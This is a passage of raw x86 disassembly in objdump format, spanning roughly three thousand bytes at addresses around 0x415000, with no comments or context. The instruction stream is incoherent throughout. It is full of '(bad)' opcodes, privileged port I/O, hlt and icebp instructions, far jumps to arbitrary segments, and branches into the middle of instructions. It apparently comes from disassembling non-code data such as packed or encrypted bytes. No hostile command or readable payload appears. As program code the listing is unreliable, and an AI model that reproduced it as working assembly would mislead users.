  414eb4:	mov    ebx,0x1ca4d292
  414eb9:	push   0x43
  414ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ebc:	(bad)  
  414ebd:	fwait
  414ebe:	dec    ebx
  414ebf:	and    ebx,DWORD PTR [ecx+0x2b589c7f]
  414ec5:	retf   0x2525
  414ec8:	adc    ah,BYTE PTR [ebp+0x1e6dc95]
  414ece:	mov    al,0xac
  414ed0:	add    ebx,DWORD PTR [ebx-0x80]
  414ed3:	xlat   BYTE PTR ds:[ebx]
  414ed4:	xchg   edi,eax
  414ed5:	int    0xdf
  414ed7:	outs   dx,DWORD PTR ds:[esi]
  414ed8:	(bad)  
  414ed9:	sbb    DWORD PTR cs:[edi+0x6e],esi
  414edd:	add    DWORD PTR [edx-0xb5b1c34],edx
  414ee3:	(bad)  
  414ee4:	cmp    eax,0x6e4f54d1
  414ee9:	adc    dl,BYTE PTR [ebx-0x4f33666c]
  414eef:	hlt    
  414ef0:	add    eax,0x8b579fd8
  414ef5:	in     al,0xca
  414ef7:	push   ss
  414ef8:	pusha  
  414ef9:	cld    
  414efa:	je     0x414e7e
  414efc:	mov    edx,0xba3d6e9b
  414f01:	jo     0x414f3d
  414f03:	in     eax,dx
  414f04:	mov    ?,ebx
  414f06:	fs pop edi
  414f08:	pop    esp
  414f09:	aam    0xbb
  414f0b:	sbb    ch,dl
  414f0d:	adc    eax,0x500aabff
  414f12:	(bad)  
  414f13:	xor    al,0x7c
  414f15:	and    eax,0x9cd618d7
  414f1a:	jp     0x414e9d
  414f1c:	cmp    eax,0x6c15f9f9
  414f21:	out    dx,al
  414f22:	xchg   BYTE PTR [eax+0x64],dh
  414f25:	adc    esp,DWORD PTR [ebx+0x14]
  414f28:	and    BYTE PTR [eax+0x3e456365],cl
  414f2e:	push   ebx
  414f2f:	nop
  414f30:	mul    BYTE PTR [esi-0x76a36387]
  414f36:	fs inc esp
  414f38:	mov    gs,WORD PTR [edi]
  414f3a:	xchg   BYTE PTR [ebx],ch
  414f3c:	ror    BYTE PTR [ecx-0x20],cl
  414f3f:	mov    ebx,0x13b2966b
  414f44:	(bad)  
  414f45:	fistp  QWORD PTR [ecx]
  414f47:	mov    bh,0xe7
  414f49:	cld    
  414f4a:	mov    bh,0x6
  414f4c:	push   0x367c4b4c
  414f51:	fsub   QWORD PTR [ebx-0x42]
  414f54:	sub    ecx,DWORD PTR [edx-0x3e60af78]
  414f5a:	(bad)  
  414f5b:	adc    eax,0x4414181
  414f60:	fwait
  414f61:	(bad)  
  414f62:	mov    edx,0xd13e0f2c
  414f67:	mov    esp,0x38f3d32
  414f6c:	push   cs
  414f6d:	jp     0x414f81
  414f6f:	es sbb dl,cl
  414f72:	push   ebx
  414f73:	sub    eax,0x65e92727
  414f78:	mov    esi,?
  414f7a:	int    0xeb
  414f7c:	sbb    eax,esp
  414f7e:	xor    bl,BYTE PTR [eax]
  414f80:	lea    edx,[edi-0x39ee4c6c]
  414f86:	je     0xcb008e1e
  414f8c:	bound  esp,QWORD PTR [edx+0x31904878]
  414f92:	sbb    BYTE PTR [esi-0x1c],bl
  414f95:	fnstsw WORD PTR [eax+0x3395b208]
  414f9b:	test   BYTE PTR [eax+0x6d4c20b7],cl
  414fa1:	pop    es
  414fa2:	and    ecx,DWORD PTR [ebx+0x7858fd2b]
  414fa8:	aaa    
  414fa9:	or     BYTE PTR [edx+0x40],0x18
  414fad:	push   cs
  414fae:	dec    edx
  414faf:	pop    eax
  414fb0:	cmp    al,0xa7
  414fb2:	push   esp
  414fb3:	sbb    eax,0xfc0ad695
  414fb8:	lock fstp TBYTE PTR [ecx-0x3a94b59f]
  414fbf:	adc    al,0x82
  414fc1:	mov    dh,0x22
  414fc3:	and    eax,0x9f1f8a4d
  414fc8:	sub    al,0xa2
  414fca:	clc    
  414fcb:	xlat   BYTE PTR ds:[ebx]
  414fcc:	fsub   DWORD PTR [eax+0x66]
  414fcf:	push   ebp
  414fd0:	xlat   BYTE PTR ds:[ebx]
  414fd1:	addr16 xchg esp,eax
  414fd3:	ret    
  414fd4:	cwde   
  414fd5:	cmp    eax,0xc3e9d54b
  414fda:	out    0xbc,eax
  414fdc:	clc    
  414fdd:	repz push ebp
  414fdf:	adc    DWORD PTR [ebp+0x7c],esp
  414fe2:	and    esp,DWORD PTR [esi-0x6d39b4bc]
  414fe8:	fisttp DWORD PTR [edi+0x598eaba3]
  414fee:	pop    edi
  414fef:	ficom  DWORD PTR [esi+0x20]
  414ff2:	inc    eax
  414ff3:	ficomp WORD PTR [edx-0x30]
  414ff6:	imul   esi,DWORD PTR [esi-0x13],0x72e3b456
  414ffd:	arpl   sp,sp
  414fff:	outs   dx,BYTE PTR ds:[esi]
  415000:	(bad)  
  415001:	fbld   TBYTE PTR [ebp+0x12]
  415004:	push   0xa03e845b
  415009:	ret    
  41500a:	mov    al,ds:0xade6949d
  41500f:	in     al,dx
  415010:	popa   
  415011:	sbb    eax,0x95711c2a
  415016:	stos   BYTE PTR es:[edi],al
  415017:	pop    edi
  415018:	adc    ebp,ecx
  41501a:	jge    0x414ff6
  41501c:	jmp    0x41501e
  41501e:	hlt    
  41501f:	xor    bh,BYTE PTR [esi-0x2e]
  415022:	enter  0x68db,0x69
  415026:	jns    0x415066
  415028:	xor    DWORD PTR [ecx+0x3f55ea78],ebp
  41502e:	xchg   ecx,eax
  41502f:	hlt    
  415030:	enter  0xf7b6,0x12
  415034:	add    al,0x85
  415036:	aas    
  415037:	leave  
  415038:	jmp    0xd194:0x76e761c8
  41503f:	fcmovnu st,st(0)
  415041:	lea    eax,[esi]
  415043:	add    al,0x7
  415045:	jae    0x415073
  415047:	(bad)  
  415048:	pop    ds
  415049:	cmp    DWORD PTR [esi+0x689a219e],ebp
  41504f:	push   0x6500e4ec
  415054:	cs ror DWORD PTR ss:[esp+eiz*4+0x7],cl
  41505a:	ja     0x41503a
  41505c:	sbb    al,0x35
  41505e:	mov    DWORD PTR [eax+0x2f],ebx
  415061:	dec    ecx
  415062:	inc    ebx
  415063:	dec    esp
  415064:	pop    esi
  415065:	add    DWORD PTR [edx-0x26b9510e],edx
  41506b:	add    edi,ebp
  41506d:	mov    WORD PTR [edi+eax*2],?
  415070:	popf   
  415071:	adc    DWORD PTR [edi],edi
  415073:	push   eax
  415074:	sub    BYTE PTR [ebp+0xa],0x3d
  415078:	inc    esi
  415079:	test   DWORD PTR [ebx+0x51],esp
  41507c:	mov    ?,eax
  41507e:	bnd jmp 0xefd23e47
  415084:	sbb    DWORD PTR [esi+0x4022ef3f],eax
  41508a:	mov    bh,BYTE PTR [edx-0x2418aa68]
  415090:	aas    
  415091:	mov    DWORD PTR [edi],esp
  415093:	xchg   BYTE PTR [ebp-0x25],dh
  415096:	imul   esp,DWORD PTR [esp+ecx*2],0xfa417214
  41509d:	aas    
  41509e:	cwde   
  41509f:	retf   
  4150a0:	nop
  4150a1:	ror    BYTE PTR [esi-0xd2f118],0xc4
  4150a8:	adc    al,0x1d
  4150aa:	js     0x415062
  4150ac:	add    DWORD PTR [esi],eax
  4150ae:	mov    ebp,0xddb0a483
  4150b3:	cmp    DWORD PTR [edi+0x6561b001],0x2c
  4150ba:	add    ebx,ebp
  4150bc:	pop    esi
  4150bd:	sbb    al,BYTE PTR [edx]
  4150bf:	fld    QWORD PTR [esi-0x6e]
  4150c2:	ficomp DWORD PTR [esp+edx*8+0x2f2cc618]
  4150c9:	pop    es
  4150ca:	les    edx,FWORD PTR [eax]
  4150cc:	push   esp
  4150cd:	dec    esp
  4150ce:	enter  0xd5a3,0x8a
  4150d2:	scas   eax,DWORD PTR es:[edi]
  4150d3:	jp     0x4150af
  4150d5:	jp     0x4150a5
  4150d7:	push   ebp
  4150d8:	mov    bh,0x28
  4150da:	enter  0xbbe6,0x86
  4150de:	loopne 0x415097
  4150e0:	adc    DWORD PTR [edi-0x4b],ebp
  4150e3:	pop    es
  4150e4:	xor    al,0xba
  4150e6:	push   cs
  4150e7:	or     eax,0x95c31eb9
  4150ec:	mov    esp,0x456357
  4150f1:	sar    BYTE PTR ds:0xa2fcde2b,0x8e
  4150f8:	in     al,dx
  4150f9:	push   ss
  4150fa:	ret    0x70e8
  4150fd:	xchg   DWORD PTR [edi],esi
  4150ff:	pop    esi
  415100:	mov    DWORD PTR [edi],0x88fb1c9
  415106:	hlt    
  415107:	sti    
  415108:	push   esp
  415109:	fstp   TBYTE PTR [ebx+0x28a6570a]
  41510f:	xchg   esi,eax
  415110:	jb     0x415149
  415112:	jp     0x4150ef
  415114:	sbb    al,0x70
  415116:	lods   eax,DWORD PTR ds:[esi]
  415117:	adc    dl,BYTE PTR [ebx+0x5d]
  41511a:	pop    esi
  41511b:	mov    dl,0xcc
  41511d:	cmp    eax,0x15937841
  415122:	mov    edi,0xe58ed9e6
  415127:	jno    0x4150e6
  415129:	sbb    ecx,ebp
  41512b:	dec    ecx
  41512c:	ret    0x3028
  41512f:	(bad)  
  415131:	push   ss
  415132:	xchg   esi,eax
  415133:	les    eax,FWORD PTR [esi+0x7d48218b]
  415139:	shl    DWORD PTR [edx],1
  41513b:	shl    BYTE PTR [ecx],1
  41513d:	les    edx,FWORD PTR [esi+0x61d7f6d]
  415143:	mov    bl,BYTE PTR [ebx+0x1a9e4374]
  415149:	sti    
  41514a:	xlat   BYTE PTR ds:[ebx]
  41514b:	(bad)  
  41514c:	push   esp
  41514d:	(bad)
  415150:	jp     0x4151a3
  415152:	loope  0x415183
  415154:	adc    BYTE PTR [esi-0x465bd145],dh
  41515a:	and    cl,BYTE PTR [ebx]
  41515c:	add    eax,DWORD PTR [eax-0x68]
  41515f:	popa   
  415160:	push   ebx
  415161:	test   DWORD PTR [ebp+0x42c651e5],edi
  415167:	dec    edi
  415168:	or     ebx,DWORD PTR [eax]
  41516a:	adc    dl,BYTE PTR [ebx-0x1756eb97]
  415170:	imul   edi,DWORD PTR [esi],0xbf119cba
  415176:	mov    esi,0x706aff0f
  41517b:	icebp  
  41517c:	call   0xbf82:0x3fe10de7
  415183:	inc    esi
  415184:	xchg   ebx,eax
  415185:	add    bl,al
  415187:	leave  
  415188:	jo     0x41511f
  41518a:	fs push ax
  41518d:	in     al,dx
  41518e:	cmp    esp,edi
  415190:	mov    cl,0xa9
  415192:	sbb    bh,BYTE PTR [edx+0x5e]
  415195:	and    BYTE PTR [ebx+ecx*8+0x46c73601],dh
  41519c:	jae    0x4151c6
  41519e:	loop   0x41517e
  4151a0:	popf   
  4151a1:	mov    eax,ds:0x3e0616b7
  4151a6:	stc    
  4151a7:	and    ah,BYTE PTR [eax]
  4151a9:	retf   0x850c
  4151ac:	aad    0xef
  4151ae:	cmc    
  4151af:	jmp    0xcce8:0xd635b2f6
  4151b6:	sahf   
  4151b7:	add    eax,0x54f46e8e
  4151bc:	mov    bl,0x15
  4151be:	mov    ah,0x4e
  4151c0:	xor    bh,bl
  4151c2:	cmp    DWORD PTR [edi-0x346b8b7e],0x927c7fcd
  4151cc:	ficom  DWORD PTR [eax]
  4151ce:	jl     0x4151ed
  4151d0:	xchg   ebp,eax
  4151d1:	fiadd  DWORD PTR [ecx+0x52bd476b]
  4151d7:	or     BYTE PTR [esi+esi*8],0xc1
  4151db:	ds (bad) 
  4151dd:	mov    WORD PTR [edx-0x319aa60d],?
  4151e3:	ror    DWORD PTR [esi+0x6e],1
  4151e6:	pop    edx
  4151e7:	add    DWORD PTR [edi-0x49],eax
  4151ea:	sub    eax,0xce33a543
  4151ef:	hlt    
  4151f0:	and    ch,BYTE PTR [ebx]
  4151f2:	outs   dx,DWORD PTR ds:[esi]
  4151f3:	pop    es
  4151f4:	enter  0xefce,0x42
  4151f8:	dec    ebp
  4151f9:	or     bl,BYTE PTR [edi-0x331ef57f]
  4151ff:	jns    0x415254
  415201:	fwait
  415202:	push   eax
  415203:	(bad)  
  415206:	adc    al,bl
  415208:	fsubp  st(0),st
  41520a:	imul   eax,DWORD PTR ds:0xf717678d,0x10189e7b
  415214:	sbb    al,BYTE PTR [ecx+0x1d67744f]
  41521a:	hlt    
  41521b:	ja     0x415278
  41521d:	les    ecx,FWORD PTR [esp+edi*8-0x4f8976e5]
  415224:	loopne 0x4151bf
  415226:	pop    es
  415227:	and    eax,0x68244ef4
  41522c:	sub    DWORD PTR [ebx],ebp
  41522e:	mov    al,BYTE PTR [edi+edi*8+0x55]
  415232:	jb     0x41528e
  415234:	icebp  
  415235:	leave  
  415236:	add    BYTE PTR [esi],al
  415238:	jmp    0xd832:0x490f0071
  41523f:	add    ebp,DWORD PTR [edx]
  415241:	pop    eax
  415242:	xor    al,0x8
  415244:	aaa    
  415245:	dec    ecx
  415246:	sbb    ebp,esp
  415248:	cmc    
  415249:	xor    esi,edx
  41524b:	lods   al,BYTE PTR ds:[esi]
  41524c:	or     BYTE PTR [esi],bh
  41524e:	and    eax,0x944f2e39
  415253:	xor    eax,0x79655d5
  415258:	mov    WORD PTR [ecx],fs
  41525a:	push   ecx
  41525b:	aas    
  41525c:	dec    esi
  41525d:	adc    al,0x4c
  41525f:	push   ss
  415260:	mov    edx,DWORD PTR [ebp-0x39]
  415263:	je     0x4152af
  415265:	adc    BYTE PTR ds:[ecx],ah
  415268:	jecxz  0x4152a1
  41526a:	jp     0x415284
  41526c:	xor    BYTE PTR [eax+0x26],cl
  41526f:	mov    eax,0x36eace12
  415274:	mov    edi,0x628c184f
  415279:	jb     0x415239
  41527b:	inc    esi
  41527c:	hlt    
  41527d:	push   edi
  41527e:	fnstcw WORD PTR [ebx]
  415280:	or     BYTE PTR [eax+0x6e66aa11],bl
  415286:	mov    ch,0x4f
  415288:	mov    bl,0xf4
  41528a:	mov    ds:0xf1b2c11f,al
  41528f:	(bad)  
  415290:	jns    0x4152b9
  415292:	add    ah,BYTE PTR [esi+eax*8]
  415295:	xchg   ebx,eax
  415296:	data16 mov ds:0xc665deda,al
  41529c:	mov    ecx,ecx
  41529e:	and    DWORD PTR [ebx-0x6],eax
  4152a1:	jmp    0x956a:0xd41790e7
  4152a8:	neg    DWORD PTR [ebx+0x5cd3da62]
  4152ae:	push   edx
  4152af:	lea    ebx,[edi+0x47]
  4152b2:	inc    edi
  4152b3:	push   edi
  4152b4:	and    BYTE PTR [ebx-0x47b24dd6],0x33
  4152bb:	icebp  
  4152bc:	sahf   
  4152bd:	rcl    BYTE PTR [edx],1
  4152bf:	cmc    
  4152c0:	mov    DWORD PTR [ebx+0x61de4e2c],ecx
  4152c6:	xor    eax,0xaa8a73ac
  4152cb:	sbb    edx,DWORD PTR [edx+ebx*8]
  4152ce:	mov    BYTE PTR [edx],bh
  4152d0:	xor    ebx,esp
  4152d2:	clc    
  4152d3:	cmp    BYTE PTR [ebx],0x80
  4152d6:	xchg   edx,eax
  4152d7:	fld    QWORD PTR [eax]
  4152d9:	add    dh,ah
  4152db:	push   0x4a
  4152dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152de:	or     eax,0x1166fb6b
  4152e3:	push   ss
  4152e4:	inc    esi
  4152e5:	inc    edx
  4152e6:	push   0xa74ee64e
  4152eb:	and    edx,eax
  4152ed:	sub    ecx,DWORD PTR [esi-0x45b49908]
  4152f3:	mov    esi,0x8cab5f2
  4152f8:	out    0x14,al
  4152fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152fb:	out    dx,eax
  4152fc:	or     DWORD PTR [edx],eax
  4152fe:	rcr    DWORD PTR ds:0xdd0e7ea7,cl
  415304:	or     edx,DWORD PTR ds:0x8ce13c76
  41530a:	mov    ebp,0xaf4517cd
  41530f:	or     BYTE PTR [ecx],ah
  415311:	fwait
  415312:	sub    al,BYTE PTR [esi+0x42]
  415315:	push   edx
  415316:	pop    ss
  415317:	add    al,0x6b
  415319:	xchg   ecx,eax
  41531a:	cli    
  41531b:	pusha  
  41531c:	add    eax,0x251307dc
  415321:	or     edi,DWORD PTR fs:[esi+0x34d0da14]
  415328:	mov    eax,ds:0xf7d0fa87
  41532d:	pop    edi
  41532e:	mov    al,0x35
  415330:	xchg   DWORD PTR [ebp+edi*2-0x70eca05f],edi
  415337:	jb     0x4152fb
  415339:	div    cl
  41533b:	in     eax,dx
  41533c:	cmp    DWORD PTR [esi*1-0x141c3630],ebp
  415343:	jecxz  0x415342
  415345:	(bad)  
  415346:	popf   
  415347:	test   BYTE PTR [esi-0x2c],0xb8
  41534b:	in     al,0x64
  41534d:	lock and al,0x7c
  415350:	xchg   ebp,eax
  415351:	mov    ecx,0x758cf427
  415356:	gs push ebp
  415358:	jg     0x4152dd
  41535a:	call   0xfc32:0x3523a294
  415361:	aad    0xec
  415363:	adc    edi,edx
  415365:	js     0x41530f
  415367:	sub    ch,BYTE PTR [edx]
  415369:	mov    bl,0xa2
  41536b:	std    
  41536c:	add    al,BYTE PTR [edx-0x55db779d]
  415372:	adc    BYTE PTR [ecx-0x4d],cl
  415375:	sbb    al,0x6
  415377:	xchg   DWORD PTR [esi+0x1f],ebp
  41537a:	mov    BYTE PTR es:[ebx+0x2b22aa5f],dl
  415381:	jl     0x41539b
  415383:	jnp    0x4153de
  415385:	repz cmp DWORD PTR es:[edi],0x79
  41538a:	dec    ebx
  41538b:	push   0xf7455c5e
  415390:	xchg   BYTE PTR ds:0x86398774,bl
  415396:	xchg   ebp,eax
  415397:	dec    edx
  415398:	cs jg  0x41532d
  41539b:	cmc    
  41539c:	call   0xbfa7:0xb1b57c9c
  4153a3:	imul   DWORD PTR [ebp+0x5e]
  4153a6:	ins    BYTE PTR es:[edi],dx
  4153a7:	sti    
  4153a8:	in     al,dx
  4153a9:	dec    esi
  4153aa:	(bad)
  4153ad:	inc    esi
  4153ae:	test   BYTE PTR [esi-0x6f94283],bl
  4153b4:	push   cs
  4153b5:	neg    ebx
  4153b7:	push   cs
  4153b8:	mov    eax,DWORD PTR [edi-0x1deb13f7]
  4153be:	dec    ecx
  4153bf:	daa    
  4153c0:	addr16 jnp 0x4153ce
  4153c3:	inc    edx
  4153c4:	inc    ecx
  4153c5:	and    al,0xba
  4153c7:	out    dx,eax
  4153c8:	jb     0x4153c2
  4153ca:	cld    
  4153cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153cc:	gs cdq 
  4153ce:	push   ds
  4153cf:	pop    ss
  4153d0:	jecxz  0x4153bd
  4153d2:	inc    edi
  4153d3:	rol    ah,1
  4153d5:	push   es
  4153d6:	lds    eax,FWORD PTR [esi-0x1394d8b4]
  4153dc:	mov    al,0x87
  4153de:	mov    ds:0x78918c38,eax
  4153e3:	ret    
  4153e4:	xor    eax,0xa0998871
  4153e9:	xchg   edx,eax
  4153ea:	jg     0x41537e
  4153ec:	int    0x6c
  4153ee:	push   ebx
  4153ef:	pushf  
  4153f0:	scas   al,BYTE PTR es:[edi]
  4153f1:	stc    
  4153f2:	add    al,0x9f
  4153f4:	aas    
  4153f5:	xchg   DWORD PTR [esi+0x5a179a3e],ebx
  4153fb:	pop    edi
  4153fc:	and    al,bl
  4153fe:	adc    DWORD PTR [eax],edi
  415400:	xchg   ebp,eax
  415401:	lds    edx,FWORD PTR [ecx-0x4b55513a]
  415407:	jmp    0x672ead85
  41540c:	es add eax,0x9454236
  415412:	sar    DWORD PTR [eax-0x412258cf],1
  415418:	mov    bl,0x38
  41541a:	sub    eax,0x3f2eb635
  41541f:	rcl    DWORD PTR [edx+0x4d],0x3f
  415423:	mov    cl,BYTE PTR [edx-0x7a]
  415426:	pop    ecx
  415427:	cwde   
  415428:	fs in  al,dx
  41542a:	fdivr  QWORD PTR [esi]
  41542c:	lds    ecx,FWORD PTR [edi+0x45]
  41542f:	sbb    al,0xdd
  415431:	xchg   esi,eax
  415432:	sbb    DWORD PTR [esi+0x57c38fac],edi
  415438:	enter  0xe6d2,0xa5
  41543c:	ins    BYTE PTR es:[edi],dx
  41543d:	nop
  41543e:	jg     0x415477
  415440:	dec    eax
  415441:	pop    ebx
  415442:	add    al,0x1
  415444:	or     al,BYTE PTR [esi-0x388fee95]
  41544a:	mov    al,bh
  41544c:	jno    0x415477
  41544e:	lahf   
  41544f:	sbb    eax,0x5034637a
  415454:	mov    eax,ds:0xd63f79cd
  415459:	int3   
  41545a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41545b:	pop    ss
  41545c:	cwde   
  41545d:	ins    DWORD PTR es:[edi],dx
  41545e:	dec    esp
  41545f:	mov    edi,DWORD PTR [eax-0x57]
  415462:	ins    DWORD PTR es:[edi],dx
  415463:	std    
  415464:	loopne 0x41547d
  415466:	test   al,0x7c
  415468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415469:	outs   dx,DWORD PTR ds:[esi]
  41546a:	add    al,0xb5
  41546c:	fidiv  WORD PTR [eax-0x10]
  41546f:	dec    ebx
  415470:	repnz sbb al,0x33
  415473:	mov    gs,edx
  415475:	pop    es
  415476:	adc    edx,DWORD PTR [ecx]
  415478:	push   ebp
  415479:	dec    esp
  41547a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41547b:	mov    ah,0xfa
  41547d:	stos   DWORD PTR es:[edi],eax
  41547e:	pop    ebx
  41547f:	xor    eax,0x1290d17
  415484:	jns    0x4154b3
  415486:	int3   
  415487:	push   ebx
  415488:	(bad)  
  415489:	xchg   BYTE PTR ds:[edx],dh
  41548c:	xchg   edx,eax
  41548d:	hlt    
  41548e:	cmp    eax,0x8182cb95
  415493:	fbld   TBYTE PTR [edi-0x20566218]
  415499:	add    al,0x6d
  41549b:	(bad)  
  41549c:	js     0x415485
  41549e:	sti    
  41549f:	inc    ebp
  4154a0:	aad    0xb
  4154a2:	les    ecx,FWORD PTR [eax+edx*2]
  4154a5:	pop    esi
  4154a6:	inc    eax
  4154a7:	xor    al,0x63
  4154a9:	dec    ecx
  4154aa:	ret    
  4154ab:	pop    esp
  4154ac:	mul    DWORD PTR ds:0x4efd242d
  4154b2:	adc    bh,BYTE PTR [bx+0x739b]
  4154b7:	pop    edi
  4154b8:	pop    ds
  4154b9:	aad    0xd1
  4154bb:	push   ss
  4154bc:	mov    esp,0xb0dc049b
  4154c1:	pop    es
  4154c2:	imul   ecx,DWORD PTR ds:0x206caebd,0x3ae93b61
  4154cc:	nop
  4154cd:	out    dx,eax
  4154ce:	aad    0x4
  4154d0:	out    0x56,eax
  4154d2:	cmp    al,0xb4
  4154d4:	(bad)  
  4154d5:	push   ebx
  4154d6:	cs jae 0x4154fe
  4154d9:	lds    edi,FWORD PTR [ecx+0x21]
  4154dc:	inc    ebx
  4154dd:	out    0x2b,al
  4154df:	push   cs
  4154e0:	out    0xb6,eax
  4154e2:	mov    DWORD PTR [ebx+0x29],ebx
  4154e5:	or     eax,0x2f02b418
  4154ea:	pop    ds
  4154eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ec:	sbb    eax,0xe4ff3d35
  4154f1:	cmp    eax,0x39e5edad
  4154f6:	out    dx,eax
  4154f7:	push   es
  4154f8:	xchg   BYTE PTR [ecx+0x7828627f],bh
  4154fe:	leave  
  4154ff:	mov    dl,0xe3
  415501:	pushf  
  415502:	cmp    BYTE PTR [ebp+edx*1+0x13],bl
  415506:	ds scas al,BYTE PTR es:[edi]
  415508:	pop    ebp
  415509:	jecxz  0x41552f
  41550b:	shr    DWORD PTR [eax+eax*4+0x64],1
  41550f:	out    dx,eax
  415510:	push   0xffffffa5
  415512:	xor    ebx,edi
  415514:	add    DWORD PTR ds:0xd73d4933,edi
  41551a:	inc    eax
  41551b:	jg     0x41549d
  41551d:	fs push ecx
  41551f:	arpl   WORD PTR [ebp+0x1b],ax
  415522:	pop    eax
  415523:	sub    edi,DWORD PTR [ebx+ecx*2-0x58]
  415527:	mov    esp,0xd6d580f0
  41552c:	dec    edx
  41552d:	(bad)  
  41552e:	neg    ch
  415530:	js     0x41558a
  415532:	fldenv [ebp-0x14e82cb0]
  415538:	mov    al,0x4
  41553a:	sar    DWORD PTR [edi+0x65],cl
  41553d:	data16 add ah,BYTE PTR [esi+0x2aadbd13]
  415544:	jmp    0x415523
  415546:	inc    eax
  415547:	fcmovnu st,st(3)
  415549:	aaa    
  41554a:	mov    cs,WORD PTR [edi-0x48]
  41554d:	repz jns 0x41550d
  415550:	sub    esi,edi
  415552:	nop
  415553:	push   es
  415554:	add    eax,0x2098d754
  415559:	or     ch,BYTE PTR [ebx-0x80]
  41555c:	punpcklwd mm1,DWORD PTR [eax+0x54]
  415560:	rcr    BYTE PTR [ebx+0x4f],0x6e
  415564:	rcl    BYTE PTR [edi-0x455b594c],0x15
  41556b:	inc    eax
  41556c:	rol    DWORD PTR [esi-0x1bf807de],0x4d
  415573:	icebp  
  415574:	loope  0x415529
  415576:	sub    eax,0xd0d9393c
  41557b:	stos   DWORD PTR es:[edi],eax
  41557c:	sub    ch,BYTE PTR [eax+0x686b83e0]
  415582:	sub    DWORD PTR [edi+0x12],edi
  415585:	loop   0x4155a2
  415587:	xchg   eax,ecx
  415589:	mov    bl,0xbf
  41558b:	inc    esp
  41558c:	jnp    0x415606
  41558e:	or     DWORD PTR [eax+0x56801e93],ecx
  415594:	mov    ds:0x978cdea7,al
  415599:	mov    esp,ebx
  41559b:	stos   BYTE PTR es:[edi],al
  41559c:	aad    0xb9
  41559e:	scas   eax,DWORD PTR es:[edi]
  41559f:	pusha  
  4155a0:	cmp    al,0x9d
  4155a2:	fisub  DWORD PTR [ecx]
  4155a4:	mov    edi,0x98c70e0a
  4155a9:	stos   BYTE PTR es:[edi],al
  4155aa:	sbb    al,0x51
  4155ac:	outs   dx,DWORD PTR ds:[esi]
  4155ad:	dec    esi
  4155ae:	mov    dh,0xd3
  4155b0:	and    BYTE PTR [esi],0x71
  4155b3:	test   al,0x93
  4155b5:	jmp    0xa843:0x822221ca
  4155bc:	rcl    DWORD PTR [ebx],0x40
  4155bf:	mov    cl,0x61
  4155c1:	inc    ebx
  4155c2:	push   esp
  4155c3:	pop    esi
  4155c4:	shr    esi,0x6d
  4155c7:	and    edx,eax
  4155c9:	adc    esi,DWORD PTR [ebp+0x44]
  4155cc:	dec    ebp
  4155cd:	fmul   QWORD PTR ds:0x6cbaa0cc
  4155d3:	or     bl,BYTE PTR [ecx+0x77]
  4155d6:	dec    edi
  4155d7:	pop    esi
  4155d8:	and    al,0x2d
  4155da:	dec    eax
  4155db:	and    al,0x65
  4155dd:	adc    al,0xfb
  4155df:	cmp    esp,DWORD PTR [ebx-0x19]
  4155e2:	aam    0xc7
  4155e4:	mov    al,0xb9
  4155e6:	mov    bl,0x1d
  4155e8:	sti    
  4155e9:	or     ah,bl
  4155eb:	cmp    ah,cl
  4155ed:	in     al,dx
  4155ee:	outs   dx,BYTE PTR ds:[esi]
  4155ef:	fcomp  DWORD PTR [ecx+0xa1e9a13]
  4155f5:	pop    eax
  4155f6:	(bad)  ds:0xf7fff4a5
  4155fc:	imul   esi,DWORD PTR [edi+0x33],0xd05c4474
  415603:	shl    DWORD PTR [edx-0x36],0x8d
  415607:	xchg   cl,cl
  415609:	mov    esp,0xb18287d2
  41560e:	push   ebp
  41560f:	or     eax,0xb1dd3e1e
  415614:	push   ds
  415615:	jp     0x415679
  415617:	cmp    BYTE PTR [edx-0x7f362cbb],bh
  41561d:	aam    0x7f
  41561f:	stos   BYTE PTR es:[edi],al
  415620:	jecxz  0x415634
  415622:	icebp  
  415623:	(bad)  
  415624:	lds    ebp,FWORD PTR [edx+0x73]
  415627:	shr    BYTE PTR [edx-0x48c20109],1
  41562d:	ret    0x63dc
  415630:	sbb    ah,bl
  415632:	sbb    eax,0xd5ed05bf
  415637:	rcl    DWORD PTR [ecx-0x76],0x54
  41563b:	jmp    0x4379:0xc79850ce
  415642:	adc    BYTE PTR [ecx],0x84
  415645:	imul   eax,edi,0xffffffc2
  415648:	adc    BYTE PTR [ecx-0x72d74544],dh
  41564e:	adc    ebx,DWORD PTR [edi]
  415650:	sbb    eax,0x2514fa98
  415655:	push   eax
  415656:	dec    edi
  415657:	add    BYTE PTR [ebx],0xe3
  41565a:	ss rol edx,1
  41565d:	data16 xor dl,BYTE PTR [ecx]
  415660:	cmp    ch,ah
  415662:	dec    edx
  415663:	inc    ecx
  415664:	inc    ecx
  415665:	cli    
  415666:	xor    DWORD PTR [edi+0x21],0x7f
  41566a:	mov    eax,0x88ff4feb
  41566f:	mov    al,0x18
  415671:	dec    ebx
  415672:	mov    edx,0x219ab636
  415677:	sbb    edi,0xffffff8c
  41567a:	mov    bl,bh
  41567c:	fiadd  DWORD PTR [eax]
  41567e:	or     eax,esp
  415680:	jp     0x4156bf
  415682:	hlt    
  415683:	ret    
  415684:	addr16 ds mov esp,0xd3e9e266
  41568b:	cmp    ecx,DWORD PTR ds:0x9540ba5
  415691:	fwait
  415692:	stos   DWORD PTR es:[edi],eax
  415693:	arpl   WORD PTR [esi],bx
  415695:	adc    ch,BYTE PTR [esp+ebp*8-0x538c7e08]
  41569c:	xor    DWORD PTR [esi+0x3c1728e9],eax
  4156a2:	in     eax,dx
  4156a3:	mov    ch,0x6b
  4156a5:	in     al,0xdc
  4156a7:	sbb    bl,0xa3
  4156aa:	mov    ds:0x2d59b226,eax
  4156af:	loop   0x4156f1
  4156b1:	cs sub al,0x44
  4156b4:	jns    0x4156b7
  4156b6:	xor    esi,DWORD PTR [eax]
  4156b8:	push   esp
  4156b9:	jne    0x415737
  4156bb:	pop    ecx
  4156bc:	fs dec ebp
  4156be:	fadd   DWORD PTR [edx]
  4156c0:	sub    ebp,DWORD PTR [ebp+0x4b3d534a]
  4156c6:	mov    ecx,0xf9e1465c
  4156cb:	push   ebp
  4156cc:	imul   esp,DWORD PTR [edi],0x7174aa85
  4156d2:	ds mov dh,0x80
